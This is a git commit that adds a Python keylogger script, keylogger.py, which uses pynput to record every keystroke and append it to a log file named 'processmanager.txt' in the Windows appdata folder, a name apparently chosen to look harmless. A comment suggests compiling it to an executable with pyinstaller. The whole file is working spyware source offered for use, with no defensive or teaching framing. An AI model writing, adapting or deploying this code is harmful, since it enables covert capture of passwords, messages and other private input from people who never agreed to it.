97706127535fb3ad0853f6cc1ebe22e34898fcf7
Reetikakumari308 <98039204+Reetikakumari308@users.noreply.github.com>
2024-01-11 15:32:16 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,46 @@
+# pip3 install pyinstaller----compile python program to exe file
+import os
+from pynput.keyboard import Listener 
+#pip3 install pynput on terminal
+
+keys = []
+count = 0
+path = os.environ['appdata'] + '\\processmanager.txt'
+#path for running on windows environment
+
+path = 'processmanager.txt' 
+#path for running on  linux os
+
+def on_press(key):
+    global keys , count
+
+    keys.append(key)
+    count += 1
+
+    if count>= 1:
+        count =0 
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open(path , 'a') as f:
+        for key in keys:
+            k = str(key).replace(" ' " , "")
+            if k.find('backspace')>0:
+                f.write(' Backspace ')
+            elif k.find('enter')>0:
+                f.write('\n')
+            elif k.find('shift')>0:
+                f.write(' Shift ')
+            elif k.find('space')>0:
+                f.write(' ')
+            elif k.find('caps_lock')>0:
+                f.write(' caps_lock ')
+            elif k.find('key'):
+                f.write(k)
+            
+
+
+
+with Listener(on_press= on_press) as listener:
+    listener.join()
